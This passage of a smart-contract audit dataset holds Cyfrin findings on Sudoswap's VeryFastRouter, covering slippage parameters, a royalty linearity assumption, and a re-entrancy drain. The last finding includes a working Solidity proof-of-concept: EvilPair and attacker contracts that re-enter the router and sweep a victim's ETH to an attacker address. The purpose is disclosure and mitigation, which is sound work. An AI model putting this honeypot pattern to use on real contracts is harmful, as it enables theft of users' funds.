// Grab royalty for calc in _findMaxFillableAmtForSell\n331:                     (,, uint256 royaltyAmount) = order.pair.calculateRoyaltiesView(\n332:                         order.isERC721 ? order.nftIds[0] : LSSVMPairERC1155(address(order.pair)).nftId(), BASE\n333:                     );\n334:\n335:                     // Calculate the max number of items we can sell\n336:                     (numItemsToFill, priceToFillAt) = _findMaxFillableAmtForSell(//@audit-info priceToFillAt >= order.minExpectedOutputPerNumNFTs\n337:                         order.pair,\n338:                         pairSpotPrice,\n339:                         order.minExpectedOutputPerNumNFTs,\n340:                         protocolFeeMultiplier,\n341:                         royaltyAmount\n342:                     );\n343:                 }\n344:\n345:                 // If we can sell at least 1 item...\n346:                 if (numItemsToFill != 0) {\n347:                     // If property checking is needed, do the property check swap\n348:                     if (order.doPropertyCheck) {\n349:                         outputAmount = ILSSVMPairERC721(address(order.pair)).swapNFTsForToken(\n350:                             order.nftIds[:numItemsToFill],\n351:                             priceToFillAt,//@audit-info min expected output, different from the one specified by the user\n352:                             swapOrder.tokenRecipient,\n353:                             true,\n354:                             msg.sender,\n355:                             order.propertyCheckParams\n356:                         );\n357:                     }\n358:                     // Otherwise do a normal sell swap\n359:                     else {\n360:                         // Get subarray if ERC721\n361:                         if (order.isERC721) {\n362:                             outputAmount = order.pair.swapNFTsForToken(\n363:                                 order.nftIds[:numItemsToFill], priceToFillAt, swapOrder.tokenRecipient, true, msg.sender//@audit-info min expected output, different from the one specified by the user\n364:                             );\n365:                         }\n366:                         // For 1155 swaps, wrap as number\n367:                         else {\n368:                             outputAmount = order.pair.swapNFTsForToken(\n369:                                 _wrapUintAsArray(numItemsToFill),\n370:                                 priceToFillAt,\n371:                                 swapOrder.tokenRecipient,\n372:                                 true,\n373:                                 msg.sender\n374:                             );\n375:                         }\n376:                     }\n377:                 }\n\n```\n\nIf the actual sale of the swap is lower than the output of `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy`, the swap will fail, but it could have passed if the original `minExpectedOutputPerNumNFTs` and `maxCostPerNumNFTs` were used instead.\nIf it can be guaranteed that the output of `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy` will always represent the exact sale/cost, this may be fine, but it is not clear why the original `minExpectedOutputPerNumNFTs` and `maxCostPerNumNFTs` are not used.\n\n**Impact:**\nAlthough this does not lead to direct loss of funds, we are evaluating the severity of MEDIUM because it can lead to unintended protocol behavior.\n\n**Recommended Mitigation:**\nWe recommend using `minExpectedOutputPerNumNFTs` and `maxCostPerNumNFTs` instead of the output of `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy` as arguments to the actual swap functions.\n\n**Sudoswap:**\nAcknowledged. Given that the input values are expected to be returned from the Bonding Curve, this is likely to be an extremely rare occurance.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "\nThis bug report is about the `VeryFastRouter::swap` function in the `VeryFastRouter.sol` file. This function relies on the internal functions `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy` to find the maximum possible amount of tokens to be swapped. The output of these functions is then used as the `minExpectedTokenOutput` and `maxExpectedTokenInput` parameters for selling and buying logic, respectively.\n\nThe problem is that the actual cost of the swap can differ from the output of these functions, which can lead to unintended protocol behavior. If the actual sale of the swap is lower than the output of these functions, the swap will fail, but it could have passed if the original `minExpectedOutputPerNumNFTs` and `maxCostPerNumNFTs` were used instead.\n\nThe impact of this bug is evaluated as MEDIUM because it can lead to unintended protocol behavior, although it does not lead to direct loss of funds. The recommended mitigation is to use `minExpectedOutputPerNumNFTs` and `maxCostPerNumNFTs` instead of the output of `VeryFastRouter::_findMaxFillableAmtForSell` and `VeryFastRouter::_findMaxFillableAmtForBuy` as arguments to the actual swap functions. This has been acknowledged by Sudoswap and Cyfrin.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18413",
      "title": "Linearity assumption on the royalty can lead to denial of service",
      "impact": "HIGH",
      "content": "**Description:**\n`VeryFastRouter::swap` relies on the internal functions [`VeryFastRouter::_findMaxFillableAmtForSell`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L556) and [`VeryFastRouter::_findMaxFillableAmtForBuy`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L503) to find the maximum possible amount of tokens to be swapped via binary search as below:\n\n```solidity\nVeryFastRouter.sol\n576:         // Perform binary search\n577:         while (start <= end) {\n578:             // We check the price to sell index + 1\n579:             (\n580:                 CurveErrorCodes.Error error,\n581:                 /* newSpotPrice */\n582:                 ,\n583:                 /* newDelta */\n584:                 ,\n585:                 uint256 currentOutput,\n586:                 /* tradeFee */\n587:                 ,\n588:                 /* protocolFee */\n589:             ) = pair.bondingCurve().getSellInfo(\n590:                 spotPrice,\n591:                 // get delta from deltaAndFeeMultiplier\n592:                 uint128(deltaAndFeeMultiplier >> 96),\n593:                 (start + end) / 2,\n594:                 // get feeMultiplier from deltaAndFeeMultiplier\n595:                 uint96(deltaAndFeeMultiplier),\n596:                 protocolFeeMultiplier\n597:             );\n598:             currentOutput -= currentOutput * royaltyAmount / BASE;//@audit-info assumes royalty amount is linear\n599:             // If the bonding curve has a math error, or\n600:             // if the current output is too low relative to our max output, or\n601:             // if the current output is greater than the pair's token balance,\n602:             // then we recurse on the left half (i.e. less items)\n603:             if (\n604:                 error != CurveErrorCodes.Error.OK || currentOutput < minOutputPerNumNFTs[(start + end) / 2 - 1] /* this is the max cost we are willing to pay, zero-indexed */\n605:                     || currentOutput > pairTokenBalance\n606:             ) {\n607:                 end = (start + end) / 2 - 1;\n608:             }\n609:             // Otherwise, we recurse on the right half (i.e. more items)\n610:             else {\n611:                 numItemsToFill = (start + end) / 2;\n612:                 start = (start + end) / 2 + 1;\n613:                 priceToFillAt = currentOutput;\n614:             }\n615:         }\n```\nThe protocol is designed to integrate various royalty info providers. Line 598 assumes the royalty amount is linear; however, this assumption can be violated, especially in the case of external royalty info providers who could be malicious and return a non-linear royalty amount.\nFor example, the royalty amount can be a function of the number of tokens to be swapped (e.g. greater/fewer royalties for a larger/smaller sale amount).\nIn this case, line 598 will be violated, and the max fillable functions will return incorrect `priceToFillAt` and `numItemsToFill`.\n\nFor example, `KODAV2` royalty calculation is NOT accurately linear to the input amount due to roundings.\n\n```solidity\n    function getKODAV2RoyaltyInfo(address _tokenAddress, uint256 _id, uint256 _amount)\n        external\n        view\n        override\n        returns (address payable[] memory receivers, uint256[] memory amounts)\n    {\n        // Get the edition the token is part of\n        uint256 _editionNumber = IKODAV2(_tokenAddress).editionOfTokenId(_id);\n        require(_editionNumber > 0, \"Edition not found for token ID\");\n\n        // Get existing artist commission\n        (address artistAccount, uint256 artistCommissionRate) = IKODAV2(_tokenAddress).artistCommission(_editionNumber);\n\n        // work out the expected royalty payment\n        uint256 totalRoyaltyToPay = (_amount / modulo) * creatorRoyaltiesFee;\n\n        // Get optional commission set against the edition and work out the expected commission\n        (uint256 optionalCommissionRate, address optionalCommissionRecipient) =\n            IKODAV2(_tokenAddress).editionOptionalCommission(_editionNumber);\n        if (optionalCommissionRate > 0) {\n            receivers = new address payable[](2);\n            amounts = new uint256[](2);\n\n            uint256 totalCommission = artistCommissionRate + optionalCommissionRate;\n\n            // Add the artist and commission\n            receivers[0] = payable(artistAccount);\n            amounts[0] = (totalRoyaltyToPay / totalCommission) * artistCommissionRate;//@audit-info rounding occurs here\n\n            // Add optional splits\n            receivers[1] = payable(optionalCommissionRecipient);\n            amounts[1] = (totalRoyaltyToPay / totalCommission) * optionalCommissionRate;//@audit-info rounding occurs here\n        } else {\n            receivers = new address payable[](1);\n            amounts = new uint256[](1);\n\n            // Add the artist and commission\n            receivers[0] = payable(artistAccount);\n            amounts[0] = totalRoyaltyToPay;\n        }\n\n        return (receivers, amounts);\n    }\n```\n\nIf the royalty info provider returned higher royalty for a larger sale amount, the `priceToFillAt` will be higher than the actual sale.\nNote that the `priceToFillAt` value calculated with the linearity assumption is used as a [minimum expected output parameter](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L351) for the function `ILSSVMPairERC721::swapNFTsForToken` within the swap sell logic. Similar reasoning holds for the swap-buy logic.\n\n```solidity\nVeryFastRouter.sol\n345:                 // If we can sell at least 1 item...\n346:                 if (numItemsToFill != 0) {\n347:                     // If property checking is needed, do the property check swap\n348:                     if (order.doPropertyCheck) {\n349:                         outputAmount = ILSSVMPairERC721(address(order.pair)).swapNFTsForToken(\n350:                             order.nftIds[:numItemsToFill],\n351:                             priceToFillAt,//@audit-info min expected output\n352:                             swapOrder.tokenRecipient,\n353:                             true,\n354:                             msg.sender,\n355:                             order.propertyCheckParams\n356:                         );\n357:                     }\n358:                     // Otherwise do a normal sell swap\n359:                     else {\n360:                         // Get subarray if ERC721\n361:                         if (order.isERC721) {\n362:                             outputAmount = order.pair.swapNFTsForToken(\n363:                                 order.nftIds[:numItemsToFill], priceToFillAt, swapOrder.tokenRecipient, true, msg.sender\n364:                             );\n365:                         }\n366:                         // For 1155 swaps, wrap as number\n367:                         else {\n368:                             outputAmount = order.pair.swapNFTsForToken(\n369:                                 _wrapUintAsArray(numItemsToFill),\n370:                                 priceToFillAt,\n371:                                 swapOrder.tokenRecipient,\n372:                                 true,\n373:                                 msg.sender\n374:                             );\n375:                         }\n376:                     }\n377:                 }\n```\nThus, the swap will fail if the `priceToFillAt` is calculated to be greater than the actual sale.\n\nThe Cyfrin team acknowledges that Sudoswap expects all collections to be ERC-2981 compliant, and EIP-2981 states that the royalty amount should be linear to the amount.\nHowever, tokens can use a royalty lookup that is not compliant with EIP-2981 and can be abused to prevent honest users' valid transactions, so the protocol should not rely on the assumption that the royalty amount is linear.\n\n**Impact:**\nThe linearity assumption can be violated, especially in the case of external royalty info providers (possibly malicious), and this can lead to protocol failing to behave as expected, as legitimate swaps will fail.\nDue to these incorrect assumptions affecting the core functions, we evaluate the severity to HIGH.\n\n**Recommended Mitigation:**\nWhile we understand the protocol team intended to reduce gas costs by using the linearity assumption, we recommend using the actual royalty amount to calculate `priceToFillAt` and `numItemsToFill`.\n\n**Sudoswap:**\nAcknowledged. It is expected that the majority of NFTs will be ERC-2981 compliant.\n\n**Cyfrin:**\nAcknowledged.",
      "summary": "\nThis bug report is about the `VeryFastRouter::swap` function in the Sudoswap protocol, which relies on two internal functions to find the maximum possible amount of tokens to be swapped via binary search. The protocol is designed to integrate various royalty info providers, which can be malicious and return a non-linear royalty amount. This can lead to the max fillable functions returning incorrect `priceToFillAt` and `numItemsToFill` values, which can cause legitimate swaps to fail. The bug is considered to be high severity.\n\nThe recommended mitigation for this bug is to use the actual royalty amount to calculate `priceToFillAt` and `numItemsToFill`, rather than relying on the assumption that the royalty amount is linear. Both Sudoswap and Cyfrin have acknowledged this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Sudoswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-01-Sudoswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Hans",
        "Alex Roan",
        "0kage",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "18412",
      "title": "Malicious pair can re-enter `VeryFastRouter` to drain original caller's funds",
      "impact": "HIGH",
      "content": "**Description:**\n[`VeryFastRouter::swap`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L266) is the main entry point for a user to perform a batch of sell and buy orders on the new Sudoswap router, allowing partial fill conditions to be specified. Sell orders are executed first, followed by buy orders. The `LSSVMPair` contracts themselves are implemented in such a way that re-entrance is not possible, but the same is not true of the `VeryFastRouter`. Assuming a user calls `VeryFastRouter::swap`, selling some NFTs and passing in some additional ETH value for subsequent buy orders, an attacker can re-enter this function under certain conditions to steal the original caller's funds. Given that this function does not check whether the user input contains valid pairs, an attacker can use this to manipulate the return values of `LSSVMPair::swapNFTsForToken` and `LSSVMPair::swapTokenForSpecificNFTs`, which interferes with internal accounting. In this way, the attacker can make it appear that a buy/sell order input/output more/less value than expected.\n\nConsider the case where the attacker is a malicious royalty recipient, and their re-entrant swap order contains a single sell order and an empty array of buy orders. Calling out to their malicious pair gives control over the [`outputAmount`](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L296) value which is used in addition assignment to the [virtual balance](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L301-L302) `ethAmount` used to [transfer any remaining ETH](https://github.com/sudoswap/lssvm2/blob/78d38753b2042d7813132f26e5573c6699b605ef/src/VeryFastRouter.sol#L482-L486) after all orders have been executed, filled partially or otherwise. The current contract balance is the original caller's remaining ETH value, so the attacker would intend to have their malicious pair return this amount to drain the funds. However, without the introduction of a malicious pair contract to both the attacker's re-entrant order and the original caller's order, the attacker is prevented from stealing the remaining intermediate funds due to the safe ETH transfer of `ethAmount` as this will cause the original caller's transaction to revert at this same line - the contract is attempting to transfer balance that it no longer has. If this had instead been a transfer of the contract balance directly rather than a virtual balance, then the attacker could have succeeded in stealing the user's funds without baiting them into making a call to their malicious pair. Of course, calling a malicious pair allows it to steal any funds sent with the call, but given that this can manipulate internal accounting through an incorrect return value, as described above, calling this pair can impact other swap orders/partial fills, tricking the contract into thinking it has fewer funds than it does during the lifetime of the original caller's transaction such that the attacker can re-enter and make away with their ETH. Otherwise, the extent of this vulnerability is a DoS attack on calls to the router.\n\nThe steps to perform this exploit are as follows:\n\n* Trick the caller into including an order on the attacker's malicious pair.\n* The attacker re-enters, passing an order of sell orders and calling back to their malicious pair contract due to unvalidated user input. This inflates the `outputAmount`, which in turn inflates the `ethAmount` for their call.\n* Excess ETH is sent to the attacker.\n* The malicious pair manipulates `ethAmount` by returning a large `inputAmount`.\n* Original caller has any additional partial buy orders fail to fill and receives no ETH in return for selling their NFTs.\n\nThe second exploit case is where the caller specifies the router contract as their token recipient, performing DIY recycle ETH functionality of sorts for subsequent buy orders, likely with zero input `msg.value`. This would allow an attacker to steal intermediate balances by re-entering the final sell order before any funds are consumed by buy orders, as these funds are not tracked by `ethAmount`, and so the final transfer will not revert. Independent of a malicious royalty recipient, this also means that any excess ETH sent not consumed by subsequent buy orders will remain locked in the contract if the caller specifies the router contract as their token recipient. Pool funds are safe due to the use of the factory re-entrance guard, which prohibits calling into any of the pair swap functions that are responsible for transfers to the router. ETH value sent with ERC-20-based swaps due to user misconfiguration is also vulnerable in the case of malicious royalty recipient.\n\n**Proof of Concept:**\nThe following diff demonstrates a honeypot pair which re-enters the swap and drains the original caller's ETH:\n\n```diff\ndiff --git a/src/VeryFastRouter.sol b/src/VeryFastRouter.sol\nindex 16047b9..2bd3797 100644\n--- a/src/VeryFastRouter.sol\n+++ b/src/VeryFastRouter.sol\n@@ -85,6 +85,7 @@ contract VeryFastRouter {\n     error VeryFastRouter__InvalidPair();\n     error VeryFastRouter__BondingCurveQuoteError();\n\n+   event vfr_log_named_uint         (string key, uint val);\n     constructor(ILSSVMPairFactoryLike _factory) {\n         factory = _factory;\n     }\n@@ -403,12 +404,12 @@ contract VeryFastRouter {\n\n                 // Deduct ETH amount if it's an ETH swap\n                 if (order.ethAmount != 0) {\n-                    console.log(\"deducting eth amount\");\n-                    console.log(\"before: %s\", ethAmount);\n+                    // console.log(\"deducting eth amount\");\n+                    // console.log(\"before: %s\", ethAmount);\n                     ethAmount -= inputAmount;\n-                    console.log(\"after: %s\", ethAmount);\n-                    console.log(\"router balance: %s\", address(this).balance);\n-                    console.log(\"sender balance: %s\", msg.sender.balance);\n+                    // console.log(\"after: %s\", ethAmount);\n+                    // console.log(\"router balance: %s\", address(this).balance);\n+                    // console.log(\"sender balance: %s\", msg.sender.balance);\n                 }\n             }\n             // Otherwise, we need to do some partial fill calculations first\n@@ -488,10 +489,15 @@ contract VeryFastRouter {\n         }\n\n         // Send excess ETH back to token recipient\n-        console.log(\"ethAmount: %s\", ethAmount);\n+        emit vfr_log_named_uint(\"eth Amount\", ethAmount);\n+        emit vfr_log_named_uint(\"pair balance before\", address(this).balance);\n+        if(address(this).balance > ethAmount){\n+            emit vfr_log_named_uint(\"pair balance after\", address(this).balance - ethAmount);\n+        }\n+        else{\n+            emit vfr_log_named_uint(\"pair balance after\", 0);\n+        }\n         if (ethAmount != 0) {\n-            console.log(\"balance: %s\", address(this).balance);\n-            console.log(\"transfering %s ETH to: %s\", ethAmount, swapOrder.tokenRecipient);\n             payable(swapOrder.tokenRecipient).safeTransferETH(ethAmount); // @audit-ok - doesn't seem to be a case when this is less than the actual amount to refund\n         }\n     }\ndiff --git a/src/test/base/VeryFastRouterAllSwapTypes.sol b/src/test/base/VeryFastRouterAllSwapTypes.sol\nindex 9909271..6294bd2 100644\n--- a/src/test/base/VeryFastRouterAllSwapTypes.sol\n+++ b/src/test/base/VeryFastRouterAllSwapTypes.sol\n@@ -33,6 +33,9 @@ import {RoyaltyEngine} from \"../../RoyaltyEngine.sol\";\n import {VeryFastRouter} from \"../../VeryFastRouter.sol\";\n import {LSSVMPairFactory} from \"../../LSSVMPairFactory.sol\";\n\n+import {EvilPair} from \"../mixins/EvilPair.sol\";\n+import {EvilPairReentrancyAttacker} from \"../mixins/EvilPairReentrancyAttacker.sol\";\n+\n abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holder, ConfigurableWithRoyalties {\n     ICurve bondingCurve;\n     RoyaltyEngine royaltyEngine;\n@@ -43,6 +46,8 @@ abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holde\n     address constant ROUTER_CALLER = address(1);\n     address constant TOKEN_RECIPIENT = address(420);\n     address constant NFT_RECIPIENT = address(0x69);\n+    address constant PWNER = payable(address(999));\n+    address constant ALICE = payable(address(666));\n\n     uint256 constant START_INDEX = 0;\n     uint256 constant NUM_BEFORE_PARTIAL_FILL = 2;\n@@ -1286,4 +1291,87 @@ abstract contract VeryFastRouterAllSwapTypes is Test, ERC721Holder, ERC1155Holde\n         }\n         vm.stopPrank();\n     }\n+\n+    function testSwapEvilPairReentrancyAttack_audit() public {\n+        EvilPair evilPair;\n+        EvilPairReentrancyAttacker evilPairReentrancyAttacker;\n+        uint256 totalEthToSend = 100 ether;\n+        deal(ALICE, totalEthToSend);\n+\n+        //0. create a pair with a bonding curve\n+        uint256[] memory nftIds;\n+        LSSVMPair pair;\n+        nftIds = _getArray(START_INDEX, END_INDEX);\n+\n+        // mints END_INDEX - START_INDEX + 1 NFTs\n+        pair = setUpPairERC721ForSale(0, address(0), nftIds);\n+\n+        (uint256 delta, uint256 spotPrice) = getReasonableDeltaAndSpotPrice();\n+\n+\n+        //1. create a honeypotNft that again mints END_INDEX - START_INDEX + 1 nfts\n+        IERC721Mintable honeypotNft = _setUpERC721(address(this), address(this), ALICE);\n+\n+        //2. setup a evilPair & transfer above NFTs to the evilPair\n+        evilPair = new EvilPair(spotPrice, delta, address(pair.bondingCurve()), payable(address(0)), address(honeypotNft));\n+        for (uint256 j; j< nftIds.length; j++){\n+            IERC721(honeypotNft).transferFrom(address(this), address(evilPair), nftIds[j]);\n+        }\n+\n+        // 3. setup evil pair attacker\n+        evilPairReentrancyAttacker = new EvilPairReentrancyAttacker(router, spotPrice, PWNER, address(evilPair));\n+\n+        //4. set the evil pair attacker address as above\n+        evilPair.setAttacker(payable(evilPairReentrancyAttacker));\n+        evilPair.setReentrancyAttack(true); // just a flag to change the logic of setReentrancyAttack and swapNFTsForToken\n+        evilPair.setRouterAddress(payable(router));\n+        uint256[] memory partialFillAmounts = new uint256[](0);\n+\n+        //5. create a buy order so that we can re-enter from swapTokenForSpecificNFTs\n+        VeryFastRouter.BuyOrderWithPartialFill memory attackBuyOrder = VeryFastRouter.BuyOrderWithPartialFill({\n+            pair: LSSVMPair(address(evilPair)),\n+            maxInputAmount: totalEthToSend,\n+            ethAmount:totalEthToSend,\n+            nftIds: nftIds,\n+            expectedSpotPrice: pair.spotPrice(),\n+            isERC721: true,\n+            maxCostPerNumNFTs: partialFillAmounts\n+        });\n+\n+       VeryFastRouter.BuyOrderWithPartialFill[] memory buyOrders =\n+            new VeryFastRouter.BuyOrderWithPartialFill[](1);\n+        buyOrders[0] = attackBuyOrder;\n+\n+        //6. Create a dummy sell order - 0 array\n+        VeryFastRouter.SellOrderWithPartialFill[] memory sellOrders =\n+            new VeryFastRouter.SellOrderWithPartialFill[](0);\n+\n+        //7. Create a swap order\n+         VeryFastRouter.Order memory swapOrder = VeryFastRouter.Order({\n+            buyOrders: buyOrders,\n+            sellOrders: sellOrders,\n+            tokenRecipient: payable(TOKEN_RECIPIENT),\n+            nftRecipient: NFT_RECIPIENT,\n+            recycleETH: true\n+        });\n+\n+        //8. We calculate the price of purchasing ALL NFTs from evil pair for given bonding curve\n+        // ignore royalties for this calculation\n+        // initial balance of ALICE (100 ether) - input Amount should be the final balance in ALICE account after swap\n+        // by re-entering and placing a fake buy txn, we can drain all of ALICE's eth\n+        (, , , uint256 inputAmount, ,) = ICurve(pair.bondingCurve()).getBuyInfo(uint128(spotPrice), uint128(delta), nftIds.length, 0, 0);\n+\n+        emit log_named_uint(\"input amount to purchase all NFTs \", inputAmount);\n+        emit log_named_uint(\"Balance in Alice Account Before \", ALICE.balance);\n+        emit log_named_uint(\"Balance in Pwner Account Before \", PWNER.balance);\n+        emit log_named_uint(\"Balance in Router Account Before \", address(router).balance);\n+\n+        // 8. Perform the swap\n+        vm.prank(ALICE);\n+        router.swap{value: totalEthToSend}(swapOrder);\n+\n+        emit log_named_uint(\"Balance in Alice Account After \", ALICE.balance);\n+        emit log_named_uint(\"Balance in Pwner Account After \", PWNER.balance);\n+        emit log_named_uint(\"Balance in Router Account After \", address(router).balance);\n+    }\n }\ndiff --git a/src/test/mixins/EvilPair.sol b/src/test/mixins/EvilPair.sol\nnew file mode 100644\nindex 0000000..8a8ad6d\n--- /dev/null\n+++ b/src/test/mixins/EvilPair.sol\n@@ -0,0 +1,119 @@\n+// SPDX-License-Identifier: AGPL-3.0\n+pragma solidity ^0.8.0;\n+\n+import {console} from \"forge-std/Test.sol\";\n+import {EvilPairReentrancyAttacker} from \"./EvilPairReentrancyAttacker.sol\";\n+import {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\n+import {ICurve} from \"../../bonding-curves/ICurve.sol\";\n+\n+contract EvilPair {\n+    uint256 expectedSpotPrice;\n+    uint256 expectedDelta;\n+    address public bondingCurve;\n+    address payable attacker;\n+    uint256 counter;\n+    uint256 inputAmount;\n+    address nftAddress;\n+    address payable routerAddress;\n+    bool isReentrancyAttack;\n+\n+   event evilpair_log_named_uint         (string key, uint val);\n+   event evilpair_log_named_address      (string key, address val);\n+\n+    constructor(uint256 _expectedSpotPrice, uint256 _delta, address _bondingCurve, address payable _attacker, address _nft) {\n+        expectedSpotPrice = _expectedSpotPrice;\n+        expectedDelta = _delta;\n+        bondingCurve = _bondingCurve;\n+        attacker = _attacker;\n+        nftAddress = _nft;\n+    }\n+\n+    function setAttacker(address payable _attacker) public {\n+        attacker = _attacker;\n+    }\n+\n+    function setReentrancyAttack(bool _isAttack) public{\n+        isReentrancyAttack = _isAttack;\n+    }\n+\n+    function setRouterAddress(address payable _router) public{\n+        routerAddress = _router;\n+    }\n+\n+    function swapNFTsForToken(\n+        uint256[] calldata nftIds,\n+        uint256 minExpectedTokenOutput,\n+        address payable tokenRecipient,\n+        bool isRouter,\n+        address routerCaller\n+    ) external virtual returns (uint256) {\n+        if(isReentrancyAttack){\n+            //calculate price of original purchase of user\n+            //reserve that amount of eth for original buy txn to go through\n+            // and drain the balance funds\n+\n+            // reserveAmount of eth calculation\n+            uint256 numNfts = IERC721(nftAddress).balanceOf(address(this));\n+            (, , , uint256 inputAmount, ,) = ICurve(bondingCurve).getBuyInfo(uint128(expectedSpotPrice), uint128(expectedDelta), numNfts, 0, 0);\n+            emit evilpair_log_named_uint(\"input amount inside swapNFTForToken \", inputAmount);\n+            emit evilpair_log_named_uint(\"balance eth in evilPair currently \", address(this).balance);\n+\n+\n+            // we ignore royalties for this\n+            if(address(this).balance > inputAmount){\n+                uint256 splitPayment = (address(this).balance - inputAmount)*50/100;\n+                //transfer 50% to the router to enable a payoff\n+                (bool success, ) = address(routerAddress).call{value: splitPayment}(\"\");\n+                return splitPayment;\n+            }\n+            return 0;\n+        }\n+\n+    }\n+\n+    function swapTokenForSpecificNFTs(\n+        uint256[] calldata nftIds,\n+        uint256 maxExpectedTokenInput,\n+        address nftRecipient,\n+        bool isRouter,\n+        address routerCaller\n+    ) external payable virtual returns (uint256) {\n+        uint256 ethAmount = msg.value;\n+        if(isReentrancyAttack){\n+            EvilPairReentrancyAttacker(attacker).attack();\n+\n+        }\n+        else{\n+            sweepETH();\n+        }\n+\n+        return ethAmount;\n+    }\n+\n+    function sweepETH() public {\n+        (bool success, ) = attacker.call{value: address(this).balance}(\"\");\n+        require(success, \"eth sweep success\");\n+    }\n+\n+    function spotPrice() external view virtual returns (uint256) {\n+        return expectedSpotPrice;\n+    }\n+\n+    function delta() external view virtual returns (uint256) {\n+        return expectedDelta;\n+    }\n+\n+    function fee() external view virtual returns (uint256) {\n+        return 0;\n+    }\n+\n+    function nft() external view virtual returns (address) {\n+        return nftAddress;\n+    }\n+\n+    function calculateRoyaltiesView(uint256 assetId, uint256 saleAmount)\n+        public\n+        view\n+        returns (address payable[] memory royaltyRecipients, uint256[] memory royaltyAmounts, uint256 royaltyTotal)\n+    {}\n+}\n\\ No newline at end of file\ndiff --git a/src/test/mixins/EvilPairReentrancyAttacker.sol b/src/test/mixins/EvilPairReentrancyAttacker.sol\nnew file mode 100644\nindex 0000000..019019f\n--- /dev/null\n+++ b/src/test/mixins/EvilPairReentrancyAttacker.sol\n@@ -0,0 +1,79 @@\n+// SPDX-License-Identifier: AGPL-3.0\n+pragma solidity ^0.8.0;\n+\n+import {LSSVMPair} from \"../../LSSVMPair.sol\";\n+import {VeryFastRouter} from \"../../VeryFastRouter.sol\";\n+\n+import {console} from \"forge-std/Test.sol\";\n+\n+contract EvilPairReentrancyAttacker {\n+    VeryFastRouter immutable internal router;\n+    uint256 immutable internal expectedSpotPrice;\n+    address immutable internal PWNER;\n+    address immutable internal evilPair;\n+    uint256 counter;\n+\n+    constructor(VeryFastRouter _router, uint256 _expectedSpotPrice, address _pwner, address _evilPair) {\n+        router = _router;\n+        expectedSpotPrice = _expectedSpotPrice;\n+        PWNER = _pwner;\n+        evilPair = _evilPair;\n+    }\n+\n+    fallback() external payable {\n+        // console.log(\"entered fallback\");\n+        // if (msg.sig == this.attack.selector) {\n+        //     console.log(\"doing attack\");\n+        //     attack();\n+        //     return;\n+        // }\n+        // if (++counter == 2) {\n+        //     console.log(\"doing attack\");\n+        //     attack();\n+        // } else {\n+        //     console.log(\"doing nothing\");\n+        //     return;\n+        // }\n+    }\n+\n+    receive() external payable {}\n+\n+    function attack() public {\n+        console.log(\"executing attack\");\n+        VeryFastRouter.BuyOrderWithPartialFill[] memory attackBuyOrders = new VeryFastRouter.BuyOrderWithPartialFill[](0);\n+        VeryFastRouter.SellOrderWithPartialFill[] memory attackSellOrders = new VeryFastRouter.SellOrderWithPartialFill[](1);\n+        uint256[] memory nftInfo = new uint256[](1);\n+        nftInfo[0] = 1337;\n+        uint256[] memory empty = new uint256[](0);\n+\n+        attackSellOrders[0] = VeryFastRouter.SellOrderWithPartialFill({\n+            pair: LSSVMPair(evilPair),\n+            isETHSell: true,\n+            isERC721: true,\n+            nftIds: nftInfo,\n+            doPropertyCheck: false,\n+            propertyCheckParams: \"\",\n+            expectedSpotPrice: expectedSpotPrice < type(uint128).max ? uint128(expectedSpotPrice) : type(uint128).max,\n+            minExpectedOutput: 0,\n+            minExpectedOutputPerNumNFTs: empty\n+        });\n+\n+        VeryFastRouter.Order memory attackSwapOrder = VeryFastRouter.Order({\n+            buyOrders: attackBuyOrders,\n+            sellOrders: attackSellOrders,\n+            tokenRecipient: payable(PWNER),\n+            nftRecipient: PWNER,\n+            recycleETH: true\n+        });\n+\n+\n+        router.swap(attackSwapOrder);\n+\n+        console.log(\"completed attack\");\n+    }\n+\n+    function sweepETH() public {\n+        (bool success, ) = PWNER.call{value: address(this).balance}(\"\");\n+        require(success, \"sweep eth failed\");\n+    }\n+}\n\\ No newline at end of file\n```\n\n**Impact:**\nThis vulnerability results in the loss of user funds, with high impact and medium likelihood, so we evaluate the severity to HIGH.\n\n**Recommended Mitigation:**\nValidate user inputs to `VeryFastRouter::swap`, in particular pairs, and consider making this function non-reentrant.\n\n**Sudoswap:**\nAcknowledged, no change for now as risk surface is set to callers passing in improper arguments. Pair validation is done client-side, so less of a concern.\n\n**Cyfrin:**\nAcknowledged.",
